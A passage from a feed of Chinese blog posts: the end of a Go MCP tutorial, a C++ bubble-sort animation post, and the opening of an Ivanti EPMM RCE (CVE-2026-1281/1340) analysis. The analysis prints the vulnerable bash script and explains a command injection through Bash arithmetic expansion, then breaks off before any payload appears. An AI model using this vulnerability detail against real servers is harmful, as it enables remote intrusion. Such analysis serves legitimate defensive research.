progress 这两个新的原语, 耗时任务也可以试试这两个)</li>\n<li><strong>安全性</strong>：验证所有输入参数，防止恶意输入导致的安全问题。对于涉及系统操作的工具，需要特别注意权限控制。</li>\n<li><strong>日志记录</strong>：添加详细的日志记录，便于调试和监控工具的使用情况。</li>\n<li><strong>配置管理</strong>：将服务配置（如监听地址、端口等）提取到配置文件中，提高可维护性。</li>\n</ol>\n<h2 id=\"总结\">总结</h2>\n<p>本文通过一个简单的代码示例展示了如何使用 Go 语言开发 MCP Server 和 Client。虽然 Go 语言在 MCP 开发方面相比 Python 略显复杂，但其在并发处理、性能和部署便利性方面的优势使其成为生产环境的理想选择。</p>\n<p>需要注意的是，本文示例仅涵盖了 MCP 工具调用的基本功能。在实际业务项目中使用 Go 语言实现 MCP Server 时，还需要深入研究 MCP 协议的其他特性，如 Prompt 管理、身份认证（Auth）、会话管理等高级功能的实现方案。</p>\n<p>通过合理的设计和实现，基于 Go 语言的 MCP 服务可以为 AI 应用提供稳定、高效、安全的工具调用能力，充分发挥 Go 语言在系统编程和网络服务方面的优势。</p>\n<h2 id=\"参考\">参考</h2>\n<ul>\n<li>MCP 官方页面: <a href=\"https://modelcontextprotocol.io/docs/getting-started/intro\" rel=\"noopener nofollow\" target=\"_blank\">https://modelcontextprotocol.io/docs/getting-started/intro</a></li>\n<li>MCP 官方 Go SDK: <a href=\"https://github.com/modelcontextprotocol/go-sdk\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/modelcontextprotocol/go-sdk</a></li>\n</ul>\n\n\n</div>\n<div id=\"MySignature\">\n    <p>本文来自博客园，作者：<a href=\"https://www.cnblogs.com/XY-Heruo/\" target=\"_blank\">花酒锄作田</a>，转载请注明原文链接：<a href=\"https://www.cnblogs.com/XY-Heruo/p/19566770\" target=\"_blank\">https://www.cnblogs.com/XY-Heruo/p/19566770</a></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-03 00:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/XY-Heruo\">花酒锄作田</a>&nbsp;\n阅读(<span id=\"post_view_count\">25</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "一个昏暗的编程教室，电脑屏幕前坐着一位程序员（你），旁边站着一位好奇的朋友。",
      "link": "https://www.cnblogs.com/lixingqiu/p/19566285",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lixingqiu/p/19566285\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 20:13\">\n    <span>一个昏暗的编程教室，电脑屏幕前坐着一位程序员（你），旁边站着一位好奇的朋友。</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><img alt=\"无标题\" class=\"lazyload\" height=\"287\" width=\"297\" /></p>\n<p>&nbsp;</p>\n<p>可以先看视频：https://www.douyin.com/video/7602172380894563636</p>\n<p>朋友：“嘿，伙计，你在干啥呢？这屏幕上一堆小球在动来动去的，是啥玩意儿？”</p>\n<p>你（推了推眼镜）：“哦，这是冒泡排序的可视化程序。你知道冒泡排序吗？”</p>\n<p>朋友：“听说过，但具体咋回事我不太清楚。”</p>\n<p>你：“那我就给你讲讲。就像这些小球一样，它们一开始是乱序的，我们要把它们从小到大排好。”</p>\n<p>朋友：“那怎么排呢？”</p>\n<p>你：“很简单，就是两两比较，如果前面的比后面的大，就交换位置。就像这样——”</p>\n<p>（你指着屏幕）</p>\n<p>“你看，第一个红球和橙球比，发现红球大，于是它们交换位置；接着橙球和黄球比……”</p>\n<p>朋友：“哦，有点像打牌时理牌的感觉。”</p>\n<p>你：“对对对！就是这么个意思。每一轮下来，最大的那个数就会‘沉’到最后面，就像气泡往上冒一样，所以叫‘冒泡排序’。”</p>\n<p>朋友：“那这些小球为啥会动啊？”</p>\n<p>你：“因为我们用了C++精灵库，每个小球都是一个‘Sprite’对象，有颜色、大小、位置等属性。每次交换的时候，我们不仅换数据，还让它们的图像也跟着移动。”</p>\n<p>朋友：“哇，还挺直观的。”</p>\n<p>你：“是啊，而且你看上面还有文字提示，说现在是第几轮，最后还会显示‘演示完毕！’”</p>\n<p>朋友：“那谁写的这个程序啊？”</p>\n<p>你（得意地笑）：“我师祖——李兴球老师。他写了这个C++精灵库，方便我们做这种动画效果。”</p>\n<p>朋友：“厉害啊！那我能不能也试试？”</p>\n<p>你：“当然可以，代码都在这儿呢，你想改多少都行。”</p>\n<hr />\n<div class=\"cnblogs_code\">\n<pre>#include <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">sprites.h</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">包含C++精灵库 </span>\n<span style=\"color: rgba(0, 0, 255, 1);\">using</span> <span style=\"color: rgba(0, 0, 255, 1);\">namespace</span><span style=\"color: rgba(0, 0, 0, 1);\"> std;\nSprite rocket;      </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">建立角色叫rocket</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> Node{\n   </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> value,x;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">值和坐标</span>\n   Sprite *<span style=\"color: rgba(0, 0, 0, 1);\">sp;\n};\nvector</span>&lt;Node *&gt;<span style=\"color: rgba(0, 0, 0, 1);\"> datas;\nvector</span>&lt;<span style=\"color: rgba(0, 0, 255, 1);\">string</span>&gt; colors = {<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">red</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">orange</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">yellow</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">green</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">,\n                         </span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">cyan</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">blue</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">purple</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">pink</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">};\n</span><span style=\"color: rgba(0, 0, 255, 1);\">void</span> swap(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> i,<span style=\"color: rgba(0, 0, 255, 1);\">int</span> j){   <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">交换两个节点</span>\n     Node *a =<span style=\"color: rgba(0, 0, 0, 1);\"> datas[i];\n     Node </span>*b =<span style=\"color: rgba(0, 0, 0, 1);\"> datas[j];   \n     </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">交换a和b的x从标，并且到达自己的坐标    </span>\n     <span style=\"color: rgba(0, 0, 255, 1);\">int</span> tempx = a-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">x;\n     a</span>-&gt;x = b-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">x;\n     b</span>-&gt;x =<span style=\"color: rgba(0, 0, 0, 1);\"> tempx;\n     a</span>-&gt;sp-&gt;go(a-&gt;x,<span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n     b</span>-&gt;sp-&gt;go(b-&gt;x,<span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n     </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">在datas中的位置也要交换</span>\n     Node *<span style=\"color: rgba(0, 0, 0, 1);\">temp ;   \n     temp </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> datas[i];\n     datas[i] </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> datas[j];\n     datas[j] </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> temp;     \n}\n</span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> main(){        <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">主功能块 </span>\n   g_screen-&gt;bgcolor(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">black</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> n= randint(<span style=\"color: rgba(128, 0, 128, 1);\">5</span>,<span style=\"color: rgba(128, 0, 128, 1);\">8</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> x = <span style=\"color: rgba(128, 0, 128, 1);\">50</span>-<span style=\"color: rgba(128, 0, 128, 1);\">100</span>*n/<span style=\"color: rgba(128, 0, 128, 1);\">2</span>;    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">最左边节点坐标(起始)</span>\n   <span style=\"color: rgba(0, 0, 255, 1);\">for</span>(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> i=<span style=\"color: rgba(128, 0, 128, 1);\">0</span>;i&lt;n;i++){    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">建立n个节点，放到datas中</span>\n      <span style=\"color: rgba(0, 0, 255, 1);\">int</span> v = randint(<span style=\"color: rgba(128, 0, 128, 1);\">30</span>,<span style=\"color: rgba(128, 0, 128, 1);\">200</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n      Node </span>*node = <span style=\"color: rgba(0, 0, 255, 1);\">new</span><span style=\"color: rgba(0, 0, 0, 1);\"> Node;\n      node</span>-&gt;value =<span style=\"color: rgba(0, 0, 0, 1);\"> v;\n      node</span>-&gt;x =<span style=\"color: rgba(0, 0, 0, 1);\"> x;\n      </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">按顺序选择索引为i的颜色，组合成角色的造型图片</span>\n      <span style=\"color: rgba(0, 0, 255, 1);\">string</span> s = <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">res/circle_</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span> + colors[i] + <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">.png</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n      Sprite </span>*js = <span style=\"color: rgba(0, 0, 255, 1);\">new</span> Sprite(s); <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">新建角色，以s为造型</span>\n      js-&gt;scale(v/<span style=\"color: rgba(128, 0, 128, 1);\">100.0</span>);        <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">把角色缩小，要不然太大了</span>\n      js-&gt;penup();  js-&gt;go(x,<span style=\"color: rgba(128, 0, 128, 1);\">0</span>); js-&gt;speed(<span style=\"color: rgba(128, 0, 128, 1);\">1</span>); <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">定好起始位置</span>\n      node-&gt;sp = js;             <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">节点包含有角色指针</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">      datas.push_back(node);      \n      x </span>= x + <span style=\"color: rgba(128, 0, 128, 1);\">100</span>;     <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">每个节点相差100个单位</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">   }\n   Sprite pen{</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">blank</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">}; \n   pen.up().color(</span><span style=\"color: rgba(128, 0, 128, 1);\">0</span>).sety(<span style=\"color: rgba(128, 0, 128, 1);\">300</span>).write(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">冒泡排序算法可视化演示程序</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 128, 1);\">50</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   pen.color(</span><span style=\"color: rgba(128, 0, 128, 1);\">30</span>).sety(<span style=\"color: rgba(128, 0, 128, 1);\">230</span>).write(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">作者：李兴球,采用C++精灵库</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 128, 1);\">30</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   pen.color(</span><span style=\"color: rgba(128, 0, 128, 1);\">60</span>).sety(<span style=\"color: rgba(128, 0, 128, 1);\">180</span>).write(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">C++精灵库作者：李兴球</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 128, 1);\">20</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   rocket.wait(</span><span style=\"color: rgba(128, 0, 128, 1);\">1</span>).color(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">yellow</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>).penup().sety(<span style=\"color: rgba(128, 0, 128, 1);\">130</span><span style=\"color: rgba(0, 0, 0, 1);\">).hide();\n   </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">真正的冒泡排序核心程序开始了</span>\n   <span style=\"color: rgba(0, 0, 255, 1);\">for</span>(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> j=<span style=\"color: rgba(128, 0, 128, 1);\">1</span>;j&lt;n;j++){  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">排序的核心程序在这里</span>\n      <span style=\"color: rgba(0, 0, 255, 1);\">string</span> s = <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">第 </span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span> + to_string(j) + <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\"> 轮</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">;    \n      </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">删除最早写的文字，然后写上新的文字，并且等待1秒  </span>\n      rocket.cleartxts(<span style=\"color: rgba(128, 0, 128, 1);\">1</span>).write(s,<span style=\"color: rgba(128, 0, 128, 1);\">42</span>).wait(<span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n      </span><span style=\"color: rgba(0, 0, 255, 1);\">for</span>(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> i=<span style=\"color: rgba(128, 0, 128, 1);\">0</span>;i&lt;n-j;i++<span style=\"color: rgba(0, 0, 0, 1);\">)   \n         </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>(datas[i]-&gt;value &gt; datas[i+<span style=\"color: rgba(128, 0, 128, 1);\">1</span>]-&gt;value ) <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">发现更大的，则交换</span>\n             swap(i,i+<span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n      rocket.wait(</span><span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   }\n   rocket.cleartxts(</span><span style=\"color: rgba(128, 0, 128, 1);\">1</span>).write(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">演示完毕！</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 128, 1);\">42</span>).done();     <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">完成了</span>\n   <span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span>;    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">返回0</span>\n}</pre>\n</div>\n<p>&nbsp;</p>\n\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-02-02 20:13</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lixingqiu\">李兴球</a>&nbsp;\n阅读(<span id=\"post_view_count\">61</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Ivanti EPMM RCE CVE-2026-1340/1281完整分析",
      "link": "https://www.cnblogs.com/mhtsec/p/19566043",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/mhtsec/p/19566043\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 18:41\">\n    <span>Ivanti EPMM RCE CVE-2026-1340/1281完整分析</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"前言\">前言：</h2>\n<p>文中技术分析仅供交流讨论，poc仅供合法测试，用于企业自查，切勿用于非法测试，未授权测试造成后果由使用者承担，与本公众号以及棉花糖无关。</p>\n<h2 id=\"介绍\">介绍：</h2>\n<p>近日,Ivanti公司披露了Ivanti Endpoint Manager Mobile (EPMM)中存在的代码注入漏洞(<strong>CVE-2026-1281</strong>和<strong>CVE-2026-1340</strong>)，并确认<strong>已存在在野利用</strong>。该漏洞源于 Apache HTTPd 调用的 Bash 脚本在处理时间戳比较时，未能有效过滤恶意参数，导致攻击者可利用 Bash 算术扩展特性注入系统命令。</p>\n<h2 id=\"分析\">分析：</h2>\n<p>首先拿到补丁包</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>RPM的包那就好办了，直接查看它执行了什么即可，使用命令：</p>\n<pre><code>rpm -qp --scripts ivanti-security-update-1761642-1.0.0L-5.noarch.rpm\n</code></pre>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>emmm内容有点多，不过根据已知条件，该漏洞源于 Apache HTTPd ，补丁包里面很容易看到关键的修改Apache HTTPd配置的命令：</p>\n<pre><code>/bin/sed -i \\\n  -e 's|RewriteMap mapAppStoreURL prg:/mi/bin/map-appstore-url|RewriteMap mapAppStoreURL \"prg:/bin/java -cp /mi/bin AppStoreUrlMapper\"|g' \\\n  -e 's|RewriteMap mapAftStoreURL prg:/mi/bin/map-aft-store-url|RewriteMap mapAftStoreURL \"prg:/bin/java -cp /mi/bin AFTUrlMapper\"|g' \\\n  /etc/httpd/conf.d/ssl.conf\n</code></pre>\n<p>就是说把<code>map-appstore-url</code>和<code>map-aft-store-url</code>给换掉了不用是吧，ok我们去看看这俩脚本是什么，目录已经给了在mi/bin下，我们直接进终端查一下</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>map-appstore-url和map-aft-store-url是个bash脚本，cat就可以直接看内容(另一个脚本内容差不太多，就不展示了)。</p>\n<pre><code>#!/bin/bash\n\nset -o nounset\n\ndeclare -x MI_DATE_COMMAND=\"date +%Y-%m-%d--%H-%M-%S\"\ndeclare -x MI_DATE_FORMAT=\"%Y-%m-%d--%H-%M-%S\"\n\ndeclare -r kScriptName=$(basename $0)\ndeclare -r kScriptDirectory=$(dirname $0)\ndeclare -r kLogFile=\"/var/log/${kScriptName}.log\"\ndeclare -r kSaltFile=\"/mi/files/appstore-salt.txt\"\n\ndeclare -r kScriptStartTimeSeconds=$(date +%s)\ndeclare -r kValidTimeStampLength=${#kScriptStartTimeSeconds}\n\ndeclare -r kAftFileStoreDirectory='/mi/files/aftstore'\n\n# error codes that are used in /etc/httpd/conf.d/ssl.conf\ndeclare -r kPathTraversalAttemptedErrorCode=\"c91bbeec40aff3fd3fe0c08044c1165a\"\ndeclare -r kLinkHashMismatchErrorCode=\"44b2ff3cf69c5112061aad51e0f7d772\"\ndeclare -r kTooLateErrorCode=\"c6a0e7ca11208b4f11d04a7ee8151a46\"\ndeclare -r kTooEarlyErrorCode=\"80862895184bfa4d00b24d4fbb3d942f\"\ndeclare -r kKeyIndexOutOfBoundsErrorCode=\"f74c27fce7d8e2fecd10ab54eda6bd85\"\ndeclare -r kURLStructureInvalidErrorCode=\"b702087a848177d489a6891bd7869495\"\ndeclare -r kTimestampLengthInvalidErrorCode=\"2ecad569fdaa07e2b66ed2595cf7240f\"\ndeclare -r kLinkSpoofErrorCode=\"cbfa488e9b08d4c5d7b3b2084ffb18e7\"\ndeclare -r kLinkUsingOddTraversalErrorCode=\"f489b91db387b684f56c07e7f5e4308b\"\n\ngShouldLogToFile=\"false\"\ngSaltFileModificationTime=\"0\"\ngTestMode=\"false\"\ngErrorCode=0\ngErrorMessage=\"\"\ndeclare -a gSaltArray=( )\ngCurrentSalt=\"\"\ngHostname=\"\"\ngPath=\"\"\ngStartTime=\"\"\ngEndTime=\"\"\n\nif (( $# &gt; 0 )) ; then\n  gTestMode=\"true\"\nfi\n\n#echo \"gTestMode=${gTestMode}\"\n\n# information\nfunction log() {\n  if ${gTestMode} ; then\n    echo \"`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}\"\n  else\n    # do not log since it kills performance\n    echo \"$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}\" &gt;&gt; ${kLogFile}\n  fi\n}\n\nfunction logDebug() {\n  if ${gTestMode} ; then\n    echo \"`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}\"\n  else\n    # do not log since it kills performance\n    ${gShouldLogToFile} &amp;&amp; echo \"$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}\" &gt;&gt; ${kLogFile}\n  fi\n}\n\n# errorCode\n# information\nfunction logDenial() {\n  local theCurrentDate=\"$(MI_DATE_COMMAND)\"\n  if ${gTestMode} ; then\n    echo \"$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}\"\n  else\n    #echo \"$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}\" &gt;&gt; \"${kLogFile}\"\n    logger -t \"${kScriptName}\" -i -p local0.warning \"$theCurrentDate -- ${1}: denying: errorCode=${2}: ${@:3}\"\n  fi\n}\n\nlog \"MAIN\" \"starting\"\n\nfunction dumpSaltArray() {\n  log \"${FUNCNAME}\" \"entered\"\n\n  for theSalt in \"${gSaltArray[@]}\" ; do\n    log \"${FUNCNAME}\" \"theSalt=$theSalt\"\n  done\n}\n\nlog \"MAIN\" \"after dumpSaltArray declaration\"\n\nfunction readSaltFile() {\n  if [[ -f \"${kSaltFile}\" ]] ; then\n    theCurrentSaltModificationTime=$(stat -c %Y \"${kSaltFile}\")\n    logDebug \"${FUNCNAME}\" \"theCurrentSaltModificationTime=${theCurrentSaltModificationTime}\"\n    theDeltaTime=$(($theCurrentSaltModificationTime - $gSaltFileModificationTime))\n    logDebug \"${FUNCNAME}\" \"theDeltaTime=${theDeltaTime}\"\n\n    if [[ \"${theDeltaTime}\" -ne 0 ]] ; then\n      log \"${FUNCNAME}\" \"theDeltaTime=${theDeltaTime} not zero; loading salt from kSaltFile=${kSaltFile}\"\n      gSaltArray=( $(cat ${kSaltFile}))\n      gSaltArray[0]=\"\"\n      gSaltFileModificationTime=$theCurrentSaltModificationTime\n    fi\n  else\n    log \"${FUNCNAME}\" \"kSaltFile=${kSaltFile} not found\"\n  fi\n}\n\nlog \"MAIN\" \"after readSaltFile declaration\"\n\n#readSaltFile\n#dumpSaltArray\n#readSaltFile\n\nfunction lookupSaltByIndex() {\n#echo \"$1 ${#gSaltArray[*]}\"\n  if [ \"$1\" -lt ${#gSaltArray[*]} ] ; then\n    gCurrentSalt=${gSaltArray[$1]}\n  else\n    gCurrentSalt=\"\"\n  fi\n\n  logDebug \"${FUNCNAME}\" \"theKeyIndex=$1; gCurrentSalt=$gCurrentSalt\"\n}\n\nlog \"MAIN\" \"after lookupSaltByIndex declaration\"\n\nfunction verifyURLConsistency () {\n  logDebug \"${FUNCNAME}\" \"${1}\"\n  local ret=\"\" # this is what we eventually echo and it's the name of a file for httpd to send to the client or a pattern that Rewrite is aware of and kill the connection with the right HTTP error code\n  #theAppStoreString=${1%%:*}\n  #echo \"${theAppStoreString}\"\n  #declare\n  theOldIFS=\"${IFS}\"\n  local theArgumentArray\n\n  # process what httpd gave us in $1 splitting on the _\n  IFS=\"_\" &amp;&amp; theArgumentArray=(${1})\n\n  theAftStoreString=${theArgumentArray[0]}\n  theAftStoreAssetGUIDWithExtension=${theArgumentArray[1]}\n  gHostname=${theArgumentArray[2]}\n  theURLString=${theArgumentArray[3]}\n  #echo \"${theAftStoreString}\"\n\n  # process what mifs really gave us in $1 splitting on the ,\n  IFS=\",\" &amp;&amp; theAftStoreKeyValueArray=(${theAftStoreString})\n\n  IFS=\"${theOldIFS}\"\n\n  if (( ${#theArgumentArray[@]} != 4 )) ; then\n    ret=\"${kURLStructureInvalidErrorCode}\"\n    log \"${FUNCNAME}\" \"${ret}\" \"expecting 5 segments; actual=${#theArgumentArray[@]}\"\n  fi\n\n  if [[ -z ${ret} ]] ; then\n    for theKeyMapEntry in \"${theAftStoreKeyValueArray[@]}\" ; do\n      theKey=\"${theKeyMapEntry%%=*}\"\n      theValue=\"${theKeyMapEntry##*=}\"\n      logDebug \"${FUNCNAME}\" \"theKey=$theKey; theValue=$theValue\"\n\n      case ${theKey} in\n        kid)\n          gKeyIndex=\"${theValue}\"\n          ;;\n        st)\n          gStartTime=\"${theValue}\"\n          if (( ${#gStartTime} != \"${kValidTimeStampLength}\" )) ; then\n            ret=\"${kTimestampLengthInvalidErrorCode}\"\n          fi\n          ;;\n        et)\n          gEndTime=\"${theValue}\"\n          if (( ${#gEndTime} != \"${kValidTimeStampLength}\" )) ; then\n            ret=\"${kTimestampLengthInvalidErrorCode}\"\n          fi\n          ;;\n        h)\n          gHashPrefixString=\"${theValue}\"\n          ;;\n        *)\n          ret=\"${kURLStructureInvalidErrorCode}\"\n          logDenial \"${FUNCNAME}\" \"${ret}\" \"unknown presented key=${theKey}; theValue=${theValue}\"\n          ;;\n      esac\n    done\n  fi\n\n  if [[ -z ${ret} ]] ; then\n    lookupSaltByIndex ${gKeyIndex}\n\n    if [[ -n \"${gCurrentSalt}\" ]] ; then\n      logDebug \"${FUNCNAME}\" \"continuing: gCurrentSalt=$gCurrentSalt\"\n      theCurrentTimeSeconds=$(date +%s)\n      logDebug \"${FUNCNAME}\" \"theCurrentTimeSeconds=${theCurrentTimeSeconds}\"\n      #theCurrentTimeSeconds=1336011206\n      #theCurrentTimeSeconds=1336770818\n      #gHostname=\"cot-0000001.mobileiron.com\"\n      #gHostname=\"qa42.mobileiron.com\"\n\n      if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]] ; then\n        logDebug \"${FUNCNAME}\" \"continuing: not too early\"\n\n        if [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; then\n          logDebug \"${FUNCNAME}\" \"continuing: not too late\"\n\n          # calculate the path\n          gPath=${theURLString/\\/sha256:${theAftStoreString}/}\n          theStringToHash=\"${gCurrentSalt}${gHostname}${gPath}${gStartTime}${gEndTime}\"\n          theAssetFile=\"${theAftStoreAssetGUIDWithExtension}\"\n          # the string to hash must end with the assetfile start end\n          logDebug \"${FUNCNAME}\" \"theStringToHash=${theStringToHash}\"\n\n          if [[ \"${theStringToHash}\" = *\"${theAssetFile}${gStartTime}${gEndTime}\" ]] ; then\n            theSHA256Hash=$(echo -n 